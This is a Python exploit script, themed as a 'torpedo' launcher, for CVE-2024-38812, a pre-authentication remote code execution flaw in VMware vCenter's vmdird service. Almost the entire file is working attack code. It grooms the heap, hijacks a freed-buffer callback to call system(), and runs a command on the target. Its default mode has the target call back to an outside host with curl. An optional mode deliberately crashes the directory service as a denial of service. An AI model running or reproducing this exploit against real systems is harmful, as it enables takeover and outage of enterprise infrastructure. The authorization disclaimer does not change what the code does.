#!/usr/bin/env python3
"""VMWARE TORPEDO - CVE-2024-38812 vCenter ``vmdird`` pre-auth network-only RCE.

Torpedo-themed front-end over the validated CVE-2024-38812 chain. The exploit mechanics are
byte-for-byte identical to ``cve_2024_38812_vmdird_rce.py``; only the presentation layer changed
(ASCII art + naval-fire-control status theming). See that file's docstring for the full technical
writeup of the groom -> warm -> co-located-fragbuf-callback-hijack chain.

Chain in brief: groom N partial-PDU fragbufs (0x1050 chunks, dealloc callback at ``+0x18``) forward
of the NDR allocation -> warm the exploit connection onto that arena -> the CVE-2024-38812 relative
heap write overwrites a co-located fragbuf's ``+0x18`` callback with ``system@plt`` and stages the
command at ``fragbuf+0x00`` (the RDI argument) -> closing the groom frees the fragbuf ->
``(*(fragbuf+0x18))(fragbuf) == system(command)``.

AUTHORIZED TESTING ONLY. This fires memory-corruption overflows at a live service; run it only
against systems you own or are contracted to test under written authorization and an agreed ROE.
Examples use RFC1918 / example.com placeholders.
"""
import argparse
import logging
import re
import socket
import struct
import sys
import time
import uuid
from typing import List, Optional

_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

NDR_SYNTAX = uuid.UUID("8a885d04-1ceb-11c9-9fe8-08002b104860").bytes_le
VMDIR_UUID = uuid.UUID("2acd53d0-fa52-4eb3-9299-7dd7514b25f4").bytes_le
VMDIR_VER = (1, 4)
VMDIR_OPNUM = 1
DEFAULT_SYSTEM_PLT = 0x41AA80   # vmdird system@plt (non-PIE, fixed) on VCSA 7.0 U3p (22837322)
DEFAULT_LOWER = 0x820           # build-constant NDR->fragbuf displacement/2 for groom=120/warm=12
MAX_CMD = 0x17                  # command must fit before the callback slot at fragbuf+0x18

log = logging.getLogger("torpedo")

# ---------------------------------------------------------------------------
# Theming
# ---------------------------------------------------------------------------

BANNER = r"""
                          V M W A R E   T O R P E D O
                               CVE-2024-38812

                                      |
                                      |  
                                   ___|___
                                  /  _ _  \
                                 |  |_|_|  |
                            _____|_________|_____
                   ________/______________________\____________________
              ____/    ___                         \__  --------  \___ `--._
        _____/        /   \___________________________\_____/=====> \     `-.
  <===( O )          |   [01]    [02]    [03]    [04]              |       >
       \______________\_____________________________________________/   _.-'
        `-._                                                        _.-'
            `---..____________________________________________..---'
        ~ ~ ~  ~ ~ ~  ~ ~ ~  ~ ~ ~  ~ ~ ~  ~ ~ ~  ~ ~ ~  ~ ~ ~

                    vmdird DCE/RPC  |  pre-auth RCE
"""


class _AnsiColor:
    RESET = "\033[0m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"


_LEVEL_COLOR = {
    logging.DEBUG: _AnsiColor.DIM,
    logging.INFO: _AnsiColor.CYAN,
    logging.WARNING: _AnsiColor.YELLOW,
    logging.ERROR: _AnsiColor.RED,
    logging.CRITICAL: _AnsiColor.BOLD + _AnsiColor.RED,
}


class TorpedoFormatter(logging.Formatter):
    """Naval fire-control log formatter: colored level tags with a sonar-style prefix."""

    def __init__(self, color: bool) -> None:
        super().__init__(datefmt="%H:%M:%S")
        self.color = color

    def format(self, record: logging.LogRecord) -> str:
        ts = self.formatTime(record, self.datefmt)
        tag = {
            logging.DEBUG: "...",
            logging.INFO: ">>>",
            logging.WARNING: "!!!",
            logging.ERROR: "XXX",
            logging.CRITICAL: "###",
        }.get(record.levelno, ">>>")
        msg = record.getMessage()
        line = "[%s] %s  %s" % (ts, tag, msg)
        if self.color:
            c = _LEVEL_COLOR.get(record.levelno, "")
            line = "%s%s%s" % (c, line, _AnsiColor.RESET)
        else:
            line = _ANSI_RE.sub("", line)   # strip inline emphasis codes when color is off
        return line


def _sonar(msg: str) -> None:
    """A deliberately loud, themed status line (bypasses the level tag)."""
    log.info(msg)


# ---------------------------------------------------------------------------
# Protocol builders (unchanged from the validated PoC)
# ---------------------------------------------------------------------------

def build_bind(cid: int = 1) -> bytes:
    body = struct.pack("<HHI", 4280, 4280, 0)
    body += struct.pack("<BBH", 1, 0, 0)
    body += struct.pack("<HBB", 0, 1, 0)
    body += VMDIR_UUID + struct.pack("<HH", VMDIR_VER[0], VMDIR_VER[1])
    body += NDR_SYNTAX + struct.pack("<I", 2)
    hdr = struct.pack("<BBBB", 5, 0, 0x0B, 0x03) + b"\x10\x00\x00\x00"
    hdr += struct.pack("<HHI", 16 + len(body), 0, cid)
    return hdr + body


def build_request(opnum: int, offset_a: int, data: bytes, cid: int = 2) -> bytes:
    char_count = len(data) // 2
    stub = struct.pack("<IIII", 0x20000, 256, offset_a, char_count) + data
    if len(stub) % 4:
        stub += b"\x00" * (4 - len(stub) % 4)
    body = struct.pack("<IHH", len(stub), 0, opnum) + stub
    hdr = struct.pack("<BBBB", 5, 0, 0x00, 0x03) + b"\x10\x00\x00\x00"
    hdr += struct.pack("<HHI", 16 + len(body), 0, cid)
    return hdr + body


def build_partial(cid: int) -> bytes:
    """A PDU declaring a large frag_length but sending only part, so the receiver allocates a
    0x1050 fragbuf and blocks holding it."""
    hdr = struct.pack("<BBBB", 5, 0, 0x00, 0x03) + b"\x10\x00\x00\x00"
    hdr += struct.pack("<HHI", 0x1000, 0, cid)
    return hdr + struct.pack("<IHH", 0x800, 0, VMDIR_OPNUM) + b"\x00" * 0x20


def recv_pdu(sock: socket.socket, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            c = sock.recv(4096)
            if not c:
                break
            buf += c
            if len(buf) >= 10 and len(buf) >= struct.unpack("<H", buf[8:10])[0] > 0:
                break
    except socket.timeout:
        pass
    except OSError:
        pass
    return buf


def is_bind_ack(pdu: bytes) -> bool:
    return len(pdu) >= 3 and pdu[2] == 0x0C


def build_payload(command: str, system_plt: int) -> bytes:
    c = command.encode()
    if len(c) > MAX_CMD or b"\x00" in c:
        raise ValueError("warhead too large: command must be <= %d ASCII bytes with no NUL "
                         "(stage exec for more)" % MAX_CMD)
    return c.ljust(0x18, b"\x00") + struct.pack("<Q", system_plt)


def groom(host: str, port: int, n: int, timeout: float = 6.0) -> List[socket.socket]:
    conns: List[socket.socket] = []
    for i in range(n):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.settimeout(timeout)
            s.sendall(build_bind(cid=1))
            if not is_bind_ack(recv_pdu(s, timeout=5)):
                s.close()
                continue
            s.sendall(build_partial(2 + i))
            conns.append(s)
        except OSError:
            pass
    return conns


def warm(sock: socket.socket, count: int) -> None:
    for _ in range(count):
        try:
            sock.sendall(build_request(VMDIR_OPNUM, 0, b"\x42\x00" * 4, cid=2))
            recv_pdu(sock, timeout=3)
        except OSError:
            return


def fire(host: str, port: int, lower: int, payload: bytes, groom_n: int, warm_n: int) -> bool:
    """One torpedo: flood the tubes (groom) -> spin up gyros (warm) -> launch the overflow at
    `lower` -> cut the wires (close groom, firing the hijacked callback).
    Returns True if the torpedo left the tube (delivery, not a confirmed hit; verify out-of-band)."""
    _sonar("  flooding the tubes - establishing %d groom fragbuf connections..." % groom_n)
    conns = groom(host, port, groom_n)
    if len(conns) < groom_n // 2:
        for s in conns:
            _close(s)
        log.warning("  tube flood incomplete (%d/%d) - target busy/unreachable, holding fire",
                    len(conns), groom_n)
        return False
    _sonar("  tubes flooded (%d/%d) - spooling the firing connection" % (len(conns), groom_n))
    ex: Optional[socket.socket] = None
    try:
        ex = socket.create_connection((host, port), timeout=8)
        ex.settimeout(8)
        ex.sendall(build_bind(cid=1))
        if not is_bind_ack(recv_pdu(ex, timeout=5)):
            log.warning("  firing connection failed to arm (no BIND_ACK) - misfire")
            return False
        warm(ex, warm_n)
        _sonar("  \033[1mTORPEDOES AWAY\033[0m - launching overflow at lower=0x%x" % lower)
        ex.sendall(build_request(VMDIR_OPNUM, lower, payload, cid=3))
        try:
            recv_pdu(ex, timeout=2)
        except OSError:
            pass
        return True
    except OSError as e:
        log.warning("  launch fault: %s", e)
        return False
    finally:
        _close(ex)
        for s in conns:      # cutting the wires frees the held fragbufs -> hijacked callback fires
            _close(s)
        _sonar("  wires cut - detonation window open")


def _close(s: Optional[socket.socket]) -> None:
    if s is not None:
        try:
            s.close()
        except OSError:
            pass


def service_up(host: str, port: int, timeout: float = 4.0) -> bool:
    """Sonar ping: does the target answer a DCE/RPC BIND with a BIND_ACK?"""
    try:
        c = socket.create_connection((host, port), timeout=timeout)
        c.settimeout(timeout)
        c.sendall(build_bind())
        ack = is_bind_ack(recv_pdu(c, timeout=timeout))
        c.close()
        return ack
    except OSError:
        return False


def crash_and_wait(host: str, port: int, crash_lower: int, restart_timeout: int) -> bool:
    """*** DEPTH CHARGE - INTENTIONAL DENIAL OF SERVICE. Lab / ROE-permitting-DoS only. ***

    Force a drifted arena back to its known startup state by crashing the daemon (an out-of-region
    relative write faults it), then wait for the Likewise supervisor (lwsmd) to auto-restart a
    FRESH instance in which the build-constant displacement is valid again. Fires EXACTLY ONCE:
    lwsmd's autorestart throttle hard-stops the service after ~2 consecutive crashes (needs a login
    to clear), so this is a single reset, not a repeatable loop."""
    try:
        c = socket.create_connection((host, port), timeout=6)
        c.settimeout(6)
        c.sendall(build_bind(cid=1))
        if is_bind_ack(recv_pdu(c, timeout=5)):
            c.sendall(build_request(VMDIR_OPNUM, crash_lower, struct.pack("<Q", 0), cid=3))
            try:
                recv_pdu(c, timeout=2)
            except OSError:
                pass
        c.close()
    except OSError:
        pass
    log.info("  depth charge away (lower=0x%x) - one shot only; watching for the auto-restart",
             crash_lower)
    start = time.time()
    saw_down = False
    while time.time() - start < restart_timeout:
        up = service_up(host, port)
        if not up:
            saw_down = True
        elif saw_down:
            log.info("  target went dark and resurfaced - fresh instance serving")
            return True
        elif time.time() - start > 8:
            log.warning("  no fault observed in 8s - crash_lower=0x%x likely in a mapped region "
                        "(raise --crash-lower); proceeding against the current state", crash_lower)
            return True
        time.sleep(0.3)
    log.error("  target went dark but did not resurface within %ds - lwsmd autorestart throttle "
              "(needs a login `service-control --start vmdir`). ABORTING RUN.", restart_timeout)
    return False


def run(args: argparse.Namespace) -> int:
    if not args.no_banner:
        sys.stderr.write(BANNER + "\n")
    if args.mode == "connectback":
        if not args.callback:
            log.error("--mode connectback requires --callback HOST:PORT")
            return 2
        command = "curl %s" % args.callback
    else:
        command = args.command
    try:
        payload = build_payload(command, args.system_plt)
    except ValueError as e:
        log.error("%s", e)
        return 2

    _sonar("LOCKED ON TARGET  vmdird %s:%d" % (args.target, args.port))
    log.info("  firing solution: lower=0x%x (fragbuf +0x%x) | system@plt=0x%x | groom=%d warm=%d",
             args.lower, args.lower * 2, args.system_plt, args.groom, args.warm)
    log.info("  warhead (%d B): %r", len(command), command)
    if args.mode == "connectback":
        log.info("  arm your listener now, e.g.  nc -lvnp %s   (inbound ping = confirmed hit)",
                 args.callback.rsplit(":", 1)[-1] if ":" in args.callback else "<port>")

    if args.crash:
        log.warning("*** DEPTH CHARGES ARMED (--crash): each shot INTENTIONALLY crashes the target "
                    "first (DoS of the directory/SSO service, ~2GB core each, crash-loop risk). ***")

    _sonar("\033[1mDAMN THE TORPEDOES - FULL SPEED AHEAD\033[0m  (%d salvo%s)"
           % (args.attempts, "" if args.attempts == 1 else "s"))
    delivered = 0
    for n in range(1, args.attempts + 1):
        if args.crash:
            log.info("salvo %d/%d: depth-charge reset to a fresh instance first", n, args.attempts)
            if not crash_and_wait(args.target, args.port, args.crash_lower, args.restart_timeout):
                log.error("aborting: target did not resurface")
                break
        _sonar("=== SALVO %d/%d - FIRE ===" % (n, args.attempts))
        if fire(args.target, args.port, args.lower, payload, args.groom, args.warm):
            delivered += 1
            _sonar("  torpedo %d running hot, straight, and normal" % n)
        else:
            log.warning("  salvo %d misfired in the tube", n)
        if n < args.attempts:
            time.sleep(args.delay)

    if delivered:
        _sonar("\033[1m\033[32mSALVO COMPLETE - %d/%d TORPEDO(ES) AWAY\033[0m" % (delivered, args.attempts))
        log.info("  ~75%% first-shot hit rate; confirm the kill out-of-band (%s).",
                 "your connect-back listener" if args.mode == "connectback" else "the command's effect")
    else:
        log.error("ALL TUBES MISFIRED - 0/%d delivered. Target busy/unreachable or firing "
                  "solution off (check --lower / --groom).", args.attempts)
    return 0 if delivered else 1


def main() -> None:
    p = argparse.ArgumentParser(
        prog="vmware_torpedo.py",
        description="VMWARE TORPEDO - CVE-2024-38812 vmdird pre-auth network-only RCE "
                    "(build-constant, no leak/oracle)")
    p.add_argument("--target", "-t", required=True, help="vCenter appliance IP/host (e.g. 192.0.2.10)")
    p.add_argument("--port", "-p", type=int, default=2012, help="vmdird DCE/RPC port (default 2012)")
    p.add_argument("--mode", choices=["connectback", "marker"], default="connectback",
                   help="connectback: warhead=curl to --callback (self-verifying); marker: --command")
    p.add_argument("--callback", help="connect-back HOST:PORT for --mode connectback (e.g. 192.0.2.5:4444)")
    p.add_argument("--command", "-c", default="id>/tmp/pwn",
                   help="command for --mode marker (<=23 ASCII bytes, no NUL)")
    p.add_argument("--lower", type=lambda x: int(x, 0), default=DEFAULT_LOWER,
                   help="build-constant displacement/2 (default 0x820 for groom=120/warm=12)")
    p.add_argument("--system-plt", type=lambda x: int(x, 0), default=DEFAULT_SYSTEM_PLT,
                   help="fixed non-PIE system@plt (default 0x41aa80)")
    p.add_argument("--groom", type=int, default=120, help="partial-PDU groom connections (default 120)")
    p.add_argument("--warm", type=int, default=12, help="warm-up requests (default 12)")
    p.add_argument("--attempts", "-n", type=int, default=3,
                   help="paced salvos (default 3 -> >98%% at ~75%%/shot; keep small to avoid self-degrade)")
    p.add_argument("--delay", type=float, default=1.5, help="seconds between salvos")
    p.add_argument("--crash", action="store_true",
                   help="DEPTH CHARGE - INTENTIONAL DoS (lab / explicit-DoS-ROE only): crash-reset the "
                        "target to a fresh instance before each shot, clearing displacement drift")
    p.add_argument("--crash-lower", type=lambda x: int(x, 0), default=0x1000000,
                   help="out-of-region displacement/2 used to fault the daemon for --crash (default 0x1000000)")
    p.add_argument("--restart-timeout", type=int, default=60,
                   help="seconds to wait for a fresh restart after a --crash (default 60)")
    p.add_argument("--no-banner", action="store_true", help="suppress the ASCII torpedo banner")
    p.add_argument("--no-color", action="store_true", help="disable ANSI color in log output")
    p.add_argument("--verbose", "-v", action="store_true")
    args = p.parse_args()

    handler = logging.StreamHandler()
    color = not args.no_color and sys.stderr.isatty()
    handler.setFormatter(TorpedoFormatter(color=color))
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, handlers=[handler])
    sys.exit(run(args))


if __name__ == "__main__":
    main()
